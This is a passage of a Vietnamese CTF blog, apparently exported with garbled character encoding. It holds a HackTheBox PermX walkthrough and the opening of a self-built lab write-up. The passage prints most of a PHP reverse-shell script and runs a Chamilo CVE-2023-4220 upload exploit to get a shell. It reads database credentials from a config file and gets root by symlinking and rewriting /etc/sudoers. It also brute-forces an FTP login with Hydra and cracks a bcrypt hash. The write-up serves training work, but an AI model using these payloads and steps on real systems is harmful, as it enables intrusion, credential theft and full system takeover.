printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; LÆ°u nÃ³ láº¡i trong thÆ° má»¥c repo. Cáº¥p quyá»n thá»±c thi cho exploit vÃ  cháº¡y nÃ³\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/HTB/PermX/Chamilo-CVE-2023-4220-Exploit] â””â”€$ chmod +x CVE-2023-4220.sh â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/HTB/PermX/Chamilo-CVE-2023-4220-Exploit] â””â”€$ ./CVE-2023-4220.sh -e All options -f, -h, and -p are required. -e Usage: ./CVE-2023-4220.sh -f reverse_file -h host_link -p port_in_the_reverse_file -e Options: -f Path to the reverse file -h Host link where the file will be uploaded -p Port for the reverse shell ThÃªm cÃ¡c options nhÆ° yÃªu cáº§u, cáº§n lÆ°u Ã½ port láº¯ng nghe pháº£i trÃ¹ng vá»›i port Ä‘Ã£ cáº¥u hÃ¬nh trong file revershell\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/HTB/PermX/Chamilo-CVE-2023-4220-Exploit] â””â”€$ ./CVE-2023-4220.sh -f rvshell.php -h http://lms.permx.htb -p 4444 -e The file has successfully been uploaded. -e # Use This leter For Interactive TTY ;) # python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # export TERM=xterm # CTRL + Z # stty raw -echo; fg -e # Starting Reverse Shell On Port 4444 . . . . . . . -e listening on [any] 4444 ... connect to [10.10.14.105] from (UNKNOWN) [10.10.11.23] 42054 Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 17:01:39 up 6:38, 4 users, load average: 0.00, 0.00, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1055): Inappropriate ioctl for device bash: no job control in this shell www-data@permx:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@permx:/$ Do chÆ°a cÃ³ kinh nghiá»‡m sá»­ dá»¥ng Chamilo nÃªn tÃ´i Ä‘Ã£ há»i ChatGPT Ä‘á»ƒ tÃ¬m thÃ´ng tin Ä‘Äƒng nháº­p Ä‘Æ°á»£c lÆ°u á»Ÿ Ä‘Ã¢u trong source code\nTÃ¬m configuration.php\nwww-data@permx:/$ find / -type f -name configuration.php 2\u0026gt;/dev/null find / -type f -name configuration.php 2\u0026gt;/dev/null /var/www/chamilo/app/config/configuration.php /var/www/chamilo/plugin/sepe/src/configuration.php www-data@permx:/$ cat /var/www/chamilo/app/config/configuration.php cat /var/www/chamilo/app/config/configuration.php \u0026lt;?php // Chamilo version 1.11.24 // File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000 /* For licensing terms, see /license.txt */ /** * This file contains a list of variables that can be modified by the campus site\u0026#39;s server administrator. * Pay attention when changing these variables, some changes may cause Chamilo to stop working. * If you changed some settings and want to restore them, please have a look at * configuration.dist.php. That file is an exact copy of the config file at install time. * Besides the $_configuration, a $_settings array also exists, that * contains variables that can be changed and will not break the platform. * These optional settings are defined in the database, now * (table settings_current). */ // Database connection settings. $_configuration[\u0026#39;db_host\u0026#39;] = \u0026#39;localhost\u0026#39;; $_configuration[\u0026#39;db_port\u0026#39;] = \u0026#39;3306\u0026#39;; $_configuration[\u0026#39;main_database\u0026#39;] = \u0026#39;chamilo\u0026#39;; $_configuration[\u0026#39;db_user\u0026#39;] = \u0026#39;chamilo\u0026#39;; $_configuration[\u0026#39;db_password\u0026#39;] = \u0026#39;03F6**********\u0026#39;; // Enable access to database management for platform admins. $_configuration[\u0026#39;db_manager_enabled\u0026#39;] = false; /** * Directory settings. */ // URL to the root of your Chamilo installation, e.g.: http://www.mychamilo.com/ $_configuration[\u0026#39;root_web\u0026#39;] = \u0026#39;http://lms.permx.htb/\u0026#39;; // Path to the webroot of system, example: /var/www/ $_configuration[\u0026#39;root_sys\u0026#39;] = \u0026#39;/var/www/chamilo/\u0026#39;; // Path from your WWW-root to the root of your Chamilo installation, // example: chamilo (this means chamilo is installed in /var/www/chamilo/ $_configuration[\u0026#39;url_append\u0026#39;] = \u0026#39;\u0026#39;; /** * Login modules settings. Kiá»ƒm tra /etc/passwd\nwww-data@permx:/$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin syslog:x:107:113::/home/syslog:/usr/sbin/nologin uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin mtz:x:1000:1000:mtz:/home/mtz:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false NhÆ° váº­y á»Ÿ Ä‘Ã¢y tÃ´i chá»‰ cÃ³ 1 user mtz\nwww-data@permx:/$ ls -la /home ls -la /home total 12 drwxr-xr-x 3 root root 4096 Jan 20 18:10 . drwxr-xr-x 18 root root 4096 Jul 1 13:05 .. drwxr-x--- 6 mtz mtz 4096 Jul 15 17:51 mtz User flag # Thá»­ Ä‘Äƒng nháº­p user mtz vá»›i password vá»«a tÃ¬m Ä‘Æ°á»£c trong file config\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ ssh mtz@permx.htb mtz@permx.htb\u0026#39;s password: Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Jul 15 05:54:05 PM UTC 2024 System load: 0.0 Usage of /: 65.1% of 7.19GB Memory usage: 29% Swap usage: 0% Processes: 270 Users logged in: 1 IPv4 address for eth0: 10.10.11.23 IPv6 address for eth0: dead:beef::250:56ff:feb9:f5a7 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Jul 15 17:41:49 2024 from 10.10.16.70 mtz@permx:~$ id uid=1000(mtz) gid=1000(mtz) groups=1000(mtz) mtz@permx:~$ ls -la user.txt -rw-r----- 1 root mtz 33 Jul 15 05:02 user.txt mtz@permx:~$ Privilege escalation # mtz@permx:~$ sudo -l Matching Defaults entries for mtz on permx: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User mtz may run the following commands on permx: (ALL : ALL) NOPASSWD: /opt/acl.sh Kiá»ƒm tra file acl.sh\nmtz@permx:~$ ls -la /opt/acl.sh -rwxr-xr-x 1 root root 419 Jun 5 11:58 /opt/acl.sh mtz@permx:~$ cat /opt/acl.sh #!/bin/bash if [ \u0026#34;$#\u0026#34; -ne 3 ]; then /usr/bin/echo \u0026#34;Usage: $0 user perm file\u0026#34; exit 1 fi user=\u0026#34;$1\u0026#34; perm=\u0026#34;$2\u0026#34; target=\u0026#34;$3\u0026#34; if [[ \u0026#34;$target\u0026#34; != /home/mtz/* || \u0026#34;$target\u0026#34; == *..* ]]; then /usr/bin/echo \u0026#34;Access denied.\u0026#34; exit 1 fi # Check if the path is a file if [ ! -f \u0026#34;$target\u0026#34; ]; then /usr/bin/echo \u0026#34;Target must be a file.\u0026#34; exit 1 fi /usr/bin/sudo /usr/bin/setfacl -m u:\u0026#34;$user\u0026#34;:\u0026#34;$perm\u0026#34; \u0026#34;$target\u0026#34; mtz@permx:~$ Bash script nÃ y kiá»ƒm tra sá»± tá»“n táº¡i cá»§a file bÃªn trong thÆ° má»¥c /home/mtz, sau Ä‘Ã³ dÃ¹ng setfacl Ä‘á»ƒ thay Ä‘á»•i ACL cá»§a file, cáº¥p quyá»n cho user Ä‘Ã£ chá»‰ Ä‘á»‹nh.\nTÃ´i sáº½ táº¡o symbolc link tá»« má»™t file trong /home/mtz Ä‘áº¿n /etc/sudoers vÃ  sau Ä‘Ã³ sá»­ dá»¥ng /opt/acl.sh Ä‘á»ƒ thay Ä‘á»•i quyá»n cá»§a symbolic link nÃ y\nmtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers_link mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers_link mtz@permx:~$ echo \u0026#34;mtz ALL=(ALL:ALL) ALL\u0026#34; \u0026gt;\u0026gt; /home/mtz/sudoers_link Chuyá»ƒn sang root\nmtz@permx:~$ sudo su [sudo] password for mtz: root@permx:/home/mtz# id uid=0(root) gid=0(root) groups=0(root) root@permx:/home/mtz# cd root@permx:~# pwd /root root@permx:~# ls -la root.txt -rw-r----- 1 root root 33 Jul 15 18:01 root.txt ","date":"15 July 2024","externalUrl":null,"permalink":"/ctf/hackthebox/permx/","section":"Ctf","summary":"","title":"HackTheBox - PermX","type":"ctf"},{"content":"","date":"23 June 2024","externalUrl":null,"permalink":"/tags/ftp/","section":"Tags","summary":"","title":"Ftp","type":"tags"},{"content":"","date":"23 June 2024","externalUrl":null,"permalink":"/tags/joomla/","section":"Tags","summary":"","title":"Joomla","type":"tags"},{"content":"","date":"23 June 2024","externalUrl":null,"permalink":"/ctf/selfdev/","section":"Ctf","summary":"","title":"Self-dev","type":"ctf"},{"content":"","date":"23 June 2024","externalUrl":null,"permalink":"/tags/self-dev/","section":"Tags","summary":"","title":"Self-Dev","type":"tags"},{"content":"ÄÃ¢y lÃ  má»™t mÃ¡y tÃ´i tá»± lÃ m Ã¡p dá»¥ng má»™t sá»‘ lá»— há»•ng phá»• biáº¿n nhÆ° LFI, command injection Ä‘á»ƒ khai thÃ¡c victim, lá»£i dá»¥ng lá»—i cáº¥u hÃ¬nh yáº¿u cá»§a há»‡ thá»‘ng Ä‘á»ƒ láº¥y Ä‘Æ°á»£c cÃ¡c thÃ´ng tin quan trá»ng, tá»« Ä‘Ã³ truy cáº­p Ä‘Æ°á»£c vÃ o mÃ¡y vÃ  thá»±c hiá»‡n leo thang Ä‘áº·c quyá»n.\nTÃ´i Ä‘Ã£ cá»‘ gáº¯ng xÃ¢y dá»±ng nhiá»u hÆ¡n 1 cÃ¡ch Ä‘á»ƒ khai Ä‘Æ°á»£c mÃ¡y nÃ y. Váº­y nÃªn trong writeup nÃ y tÃ´i sáº½ trÃ¬nh bÃ y táº¥t cáº£ nhá»¯ng lá»— há»•ng vÃ  cÃ¡ch khai thÃ¡c chÃºng Ä‘á»ƒ truy cáº­p Ä‘Æ°á»£c vÃ o mÃ¡y.\nLink táº£i mÃ¡y áº£o\nMÃ¡y áº£o Ä‘Æ°á»£c cáº¥u hÃ¬nh vá»›i DHCP server. Äá»ƒ xÃ¡c Ä‘á»‹nh IP cá»§a mÃ¡y, sá»­ dá»¥ng netdiscover. TÃ´i Ä‘ang sá»­ dá»¥ng 192.168.24.0/24\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ sudo netdiscover -r 192.168.24.0/24 Reconnaissance and Scanning # 21/tcp open ftp syn-ack vsftpd 2.0.8 or later 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c5:b4:01:68:ae:ee:48:60:03:ff:38:b1:72:18:00:e4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVvPZI6pD5lkfC5jLZ/PiWiJNOBG4WYRRRxpziziHdVNnrQaRgqippRJpvbeuxOGZ7lW8yZgmik0Jab2GFkR/x7ooE/VNBxiGd/eAziTP0uT1n1WYRu7B6A1v2nL6qwDmRp/qfiQX9QwdYsWTpfrC//DuHfN5Dh2CAgOZAprUg9lRlZkFwbgfYcGwUu5GOqtZGfQtYG0NQk0B7Vp4hrLywzfidbZt8LjEF/PnGXE7SHytjGJ2MpaAjhXS2ULdFmTzHusG61WM7Az0AghxS3fXgwqQgdcBLHfKKhweGZNd+lzAzy0r439xXdMNkFwGt7Megws4DZwDm6GO1J1elcw+aOzqlXBrzzwpQ+pVeWZ9Dkg/MLroSTi1nZ2Yg7z24jDmmTAMBPLk7xZMcS+ZRdjl9f0veF8AW6u1tBunt0t0o4NvGnSdXhHgnXzamQ3wQMzxcQATTFKJKmnJnn+o9qx7t+05xcKH9pIMLNk9t7RGdeqFWZkqGmgYLdqQRLhcWYvk= | 256 a2:4e:d7:89:d4:7a:0c:bd:fa:46:60:ee:eb:a5:f8:62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIXCkEEyL46BJSiwv9eMiNA+PEw0QALYmftxcH74HZF17BCW5uXrp1zhmeeTj3HADKp3X+Lacnp/koOE+kEgTY8= | 256 02:25:87:e5:40:33:0e:b5:2c:19:89:42:af:e1:40:6b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHnbYN44WW1MB9OJSMeWXa6LqT1Hvt0+n3edKUP7v8l7 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management | http-robots.txt: 16 disallowed entries | /joomla/administrator/ /administrator/ /api/ /bin/ | /cache/ /cli/ /components/ /includes/ /installation/ |_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ |_http-title: Home |_http-server-header: Apache/2.4.41 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123 139/tcp open netbios-ssn syn-ack Samba smbd 4.6.2 445/tcp open netbios-ssn syn-ack Samba smbd 4.6.2 1337/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Cat Blog - Home | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 0s | smb2-time: | date: 2024-06-23T16:45:36 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 12631/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 63557/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 43846/udp): CLEAN (Failed to receive data) | Check 4 (port 33713/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | nbstat: NetBIOS name: FINALE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | FINALE\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | FINALE\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | FINALE\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00 Enumeration # Port 21 - FTP # Truy cáº­p FTP server vá»›i port 21\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ ftp 192.168.24.165 Connected to 192.168.24.165. 220 Welcome back, ftpuser Name (192.168.24.165:neo): Äá»ƒ Ã½ trong pháº§n banner cá»§a ftp server, cÃ³ váº» nhÆ° tÃ´i Ä‘Ã£ Ä‘Æ°á»£c cung cáº¥p sáºµn username Ä‘á»ƒ truy cáº­p ftp\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ ftp 192.168.24.165 Connected to 192.168.24.165. 220 Welcome back, ftpuser Name (192.168.24.165:neo): ftpuser 331 Please specify the password. Password: Váº­y lÃ  tÃ´i Ä‘Ã£ cÃ³ username á»Ÿ Ä‘Ã¢y, váº­y cÃ²n password? TÃ´i sáº½ thá»­ brute-force\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ hydra -l ftpuser -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt ftp://192.168.24.165 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-24 00:12:24 [DATA] max 16 tasks per 1 server, overall 16 tasks, 59185 login tries (l:1/p:59185), ~3700 tries per task [DATA] attacking ftp://192.168.24.165:21/ [STATUS] 279.00 tries/min, 279 tries in 00:01h, 58906 to do in 03:32h, 16 active [21][ftp] host: 192.168.24.165 login: ftpuser password: harrypotter 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-24 00:13:41 Truy cáº­p láº¡i ftp server\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ ftp 192.168.24.165 Connected to 192.168.24.165. 220 Welcome back, ftpuser Name (192.168.24.165:neo): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||26732|) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 120 Jun 21 18:35 start.txt 226 Directory send OK. ftp\u0026gt; get start.txt local: start.txt remote: start.txt 229 Entering Extended Passive Mode (|||17287|) 150 Opening BINARY mode data connection for start.txt (120 bytes). 100% |****************************************************************************************************| 120 57.30 KiB/s 00:00 ETA 226 Transfer complete. 120 bytes received in 00:00 (31.40 KiB/s) ftp\u0026gt; Ná»™i dung start.txt\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ cat start.txt I got his pass. But I dont know how to use this! Can you? $2a$10$lPOk4/i0R2TU70R.9HCs1.lG1TXKkX14od.1EzJnd453t4jQRSl8q TÃ´i nháº­n Ä‘Æ°á»£c má»™t password hash vá»›i format bcrypt, má»™t trong nhá»¯ng format phá»• biáº¿n nháº¥t trong linux. Sá»­ dá»¥ng john Ä‘á»ƒ decrypt nÃ³\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ echo \u0026#39;$2a$10$lPOk4/i0R2TU70R.9HCs1.lG1TXKkX14od.1EzJnd453t4jQRSl8q\u0026#39; \u0026gt; hash â”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 20 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status tequieromucho (?) 1g 0:00:00:10 DONE (2024-06-24 00:22) 0.09794g/s 141.0p/s 141.0c/s 141.0C/s teamomucho..rachelle Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Tuy nhiÃªn thÃ¬ tÃ´i chÆ°a biáº¿t password nÃ y sáº½ sá»­ dá»¥ng Ä‘á»ƒ Ä‘Äƒng nháº­p vÃ o Ä‘Ã¢u, nÃªn Ä‘á»ƒ láº¡i Ä‘Ã³.\nQuay trá»Ÿ láº¡i vá»›i pháº§n port scan, thá»­ truy cáº­p vÃ o smb vá»›i port 445 nhÆ°ng tÃ´i khÃ´ng thu Ä‘Æ°á»£c gÃ¬ thÃªm vÃ¬ server khÃ´ng chia sáº» file nÃ o.\nPort 80 - HTTP # Tiáº¿p tá»¥c vá»›i port 80 http\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ whatweb http://192.168.24.165 http://192.168.24.165 [200 OK] Apache[2.4.41], Cookies[ecf033cb8f4e3a32a22b2d4052ca809a], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[ecf033cb8f4e3a32a22b2d4052ca809a], IP[192.168.24.165], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN] TÃ´i cÃ³ ngay 1 user cá»§a Joomla lÃ  Administrator á»Ÿ trang chá»§. Káº¿t há»£p vá»›i password Ä‘Ã£ cÃ³ á»Ÿ pháº§n trÆ°á»›c, sau khi thá»­ qua má»™t vÃ i username cá»§a admin thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c thÃ´ng tin Ä‘Äƒng nháº­p admin:tequieromucho.\nSá»­ dá»¥ng dirsearch Ä‘á»ƒ tÃ¬m directory\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/Finale] â””â”€$ dirsearch -u http://192.168.24.165 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/neo/Finale/reports/http_192.168.24.165/_24-06-24_00-43-38.txt Target: http://192.168.24.165/ [00:43:38] Starting: [00:43:40] 403 - 279B - /.ht_wsr.txt [00:43:40] 403 - 279B - /.htaccess.bak1 [00:43:40] 403 - 279B - /.htaccess.orig [00:43:40] 403 - 279B - /.htaccess.sample [00:43:40] 403 - 279B - /.htaccess_extra [00:43:40] 403 - 279B - /.htaccess_orig [00:43:40] 403 - 279B - /.htaccess_sc [00:43:40] 403 - 279B - /.htaccessOLD [00:43:40] 403 - 279B - /.htaccessBAK [00:43:40] 403 - 279B - /.htaccess.save [00:43:40] 403 - 279B - /.htaccessOLD2 [00:43:40] 403 - 279B - /.htm [00:43:40] 403 - 279B - /.html [00:43:40] 403 - 279B - /.htpasswds [00:43:40] 403 - 279B - /.htpasswd_test [00:43:40] 403 - 279B - /.httr-oauth [00:43:42] 403 - 279B - /.php [00:43:51] 301 - 324B - /administrator -\u0026gt; http://192.168.24.165/administrator/ [00:43:51] 200 - 31B - /administrator/cache/ [00:43:51] 301 - 329B - /administrator/logs -\u0026gt; http://192.168.24.165/administrator/logs/ [00:43:51] 200 - 507B - /administrator/includes/ [00:43:51] 200 - 31B - /administrator/logs/ [00:43:51] 200 - 3KB - /administrator/ [00:43:51] 200 - 3KB - /administrator/index.php [00:43:53] 301 - 314B - /api -\u0026gt; http://192.168.24.165/api/ [00:43:53] 404 - 54B - /api/ [00:43:56] 301 - 316B - /cache -\u0026gt; http://192.168.24.165/cache/ [00:43:56] 200 - 31B - /cache/ [00:43:57] 200 - 31B - /cli/ [00:43:58] 301 - 321B - /components -\u0026gt; http://192.168.24.165/components/ [00:43:58] 200 - 31B - /components/ [00:43:58] 200 - 0B - /configuration.php [00:44:05] 200 - 3KB - /htaccess.txt [00:44:06] 301 - 317B - /images -\u0026gt; http://192.168.24.165/images/ [00:44:06] 200 - 31B - /images/ [00:44:06] 301 - 319B - /includes -\u0026gt; http://192.168.24.165/includes/ [00:44:06] 200 - 31B - /includes/ [00:44:06] 404 - 4KB - /index.php/login/ [00:44:07] 200 - 2KB - /index.php [00:44:08] 301 - 319B - /language -\u0026gt; http://192.168.24.165/language/ [00:44:08] 200 - 31B - /layouts/ [00:44:08] 403 - 279B - /libraries/ [00:44:08] 403 - 279B - /libraries/phpmailer/ [00:44:08] 403 - 279B - /libraries/tiny_mce [00:44:08] 403 - 279B - /libraries/tiny_mce/ [00:44:08] 403 - 279B - /libraries/tinymce [00:44:08] 403 - 279B - /libraries/tinymce/ [00:44:08] 403 - 279B - /libraries [00:44:08] 200 - 7KB - /LICENSE.txt [00:44:11] 301 - 316B - /media -\u0026gt; http://192.168.24.165/media/ [00:44:11] 200 - 31B - /media/ [00:44:12] 200 - 31B - /modules/ [00:44:12] 301 - 318B - /modules -\u0026gt; http://192.168.24.165/modules/ [00:44:17] 301 - 318B - /plugins -\u0026gt; http://192.168.24.165/plugins/ [00:44:17] 200 - 31B - /plugins/ [00:44:19] 200 - 2KB - /README.txt [00:44:20] 200 - 360B - /robots.txt [00:44:21] 403 - 279B - /server-status [00:44:21] 403 - 279B - /server-status/ [00:44:26] 301 - 320B - /templates -\u0026gt; http://192.168.24.165/templates/ [00:44:26] 200 - 31B - /templates/ [00:44:26] 200 - 31B - /templates/index.html [00:44:26] 200 - 0B - /templates/system/ [00:44:26] 301 - 314B - /tmp -\u0026gt; http://192.168.24.165/tmp/ [00:44:26] 200 - 31B - /tmp/ [00:44:31] 200 - 877B - /web.config.txt Task Completed Truy cáº­p vÃ o /administrator/ tÃ´i cÃ³ login form quáº£n trá»‹ cá»§a joomla. Thá»­ login vá»›i thÃ´ng tin Ä‘Äƒng nháº­p Ä‘Ã£ cÃ³\nVá»›i phiÃªn báº£n 5.1.1 cá»§a joomla lÃ  má»™t 